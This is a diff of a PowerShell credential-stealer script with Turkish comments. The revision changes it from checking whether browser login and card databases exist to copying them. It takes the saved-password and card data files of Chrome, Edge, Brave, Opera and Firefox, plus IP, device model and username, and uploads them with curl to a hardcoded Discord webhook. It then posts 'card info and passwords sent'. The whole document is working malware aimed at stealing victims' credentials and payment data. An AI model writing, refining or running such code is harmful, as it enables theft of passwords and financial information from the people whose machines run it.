@@ -1,41 +1,35 @@
-$webhook = "https://discord.com/api/webhooks/1501992942435307532/boIQdDen1QjAWSFgQwKBBtIN7dgbleLaOn7yllPYGN_LyGNs5PouMJbdEsDZbSYN_G2A"
+$w = "https://discord.com/api/webhooks/1501992942435307532/boIQdDen1QjAWSFgQwKBBtIN7dgbleLaOn7yllPYGN_LyGNs5PouMJbdEsDZbSYN_G2A"
 
-# --- VERİ TOPLAMA ---
-$cihaz_adi = $env:COMPUTERNAME
-$oturum_sahibi = $env:USERNAME
-$ip = "Bulunamadı"
-try { $ip = (Invoke-WebRequest -uri "ifconfig.me/ip" -UserAgent "curl" -TimeoutSec 5).Content } catch {}
+# --- SAF VERİ TOPLAMA ---
+$ip = "Bilinmiyor"
+try { $ip = (Invoke-WebRequest -uri "ifconfig.me/ip" -UserAgent "curl").Content.Trim() } catch {}
+$cihaz = (Get-CimInstance Win32_ComputerSystem).Model
+$kullanici = $env:USERNAME
 
-# Tarayıcı Yolları
-$chrome_login = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
-$chrome_card = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data"
+# --- DİREKT METİN OLARAK GÖNDER ---
+$mesaj = "İp $ip`nCihaz ismi $cihaz`nKullanici ismi $kullanici"
+& "curl.exe" -d "content=$mesaj" $w
 
-# Şifre ve Kart Kontrolü
-$uygulama_bilgileri = "Bulunamadı"
-if (Test-Path $chrome_login) {
-    $uygulama_bilgileri = "✅ Kayıtlı Uygulama ve Kullanıcı Adları Mevcut"
+# --- TÜM TARAYICI YOLLARI (ŞİFRE VE KART) ---
+$hedef_dosyalar = @(
+    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
+    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data",
+    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data",
+    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Web Data",
+    "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data",
+    "$env:AppData\Opera Software\Opera Stable\Login Data",
+    "$env:APPDATA\Mozilla\Firefox\Profiles\*\logins.json"
+)
+
+# --- DOSYALARI ÇAL VE FIRLAT ---
+foreach ($dosya in $hedef_dosyalar) {
+    if (Test-Path $dosya) {
+        $gecici = "$env:TEMP\$(random).db"
+        Copy-Item $dosya -Destination $gecici -Force
+        & "curl.exe" -F "file=@$gecici" $w
+        Remove-Item $gecici
+    }
 }
 
-$kart_bilgileri = "Bulunamadı"
-if (Test-Path $chrome_card) {
-    $kart_bilgileri = "💳 Kayıtlı Kart Verileri Mevcut"
-}
-
-# --- DISCORD RAPORU (SADE VE SIRALI) ---
-$payload = @{
-    embeds = @(@{
-        title = "🚀 Sistem Sızma Özeti"
-        color = 16711680 # Kırmızı
-        fields = @(
-            @{ name = "Cihaz Adı"; value = "🖥️ $cihaz_adi"; inline = $false },
-            @{ name = "Kullanıcı Adı"; value = "👤 $oturum_sahibi"; inline = $false },
-            @{ name = "Uygulama Şifreleri"; value = "🔑 $uygulama_bilgileri"; inline = $false },
-            @{ name = "Kart Bilgileri"; value = "💳 $kart_bilgileri"; inline = $false },
-            @{ name = "IP Adresi"; value = "🌐 $ip"; inline = $true }
-        )
-        footer = @{ text = "Veri Akışı Aktif" }
-    })
-} | ConvertTo-Json -Depth 10
-
-# Gönderim
-Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType 'application/json'
+# --- SON BİLGİ ---
+& "curl.exe" -d "content=kart bilgileri ve sifreler gonderildi" $w
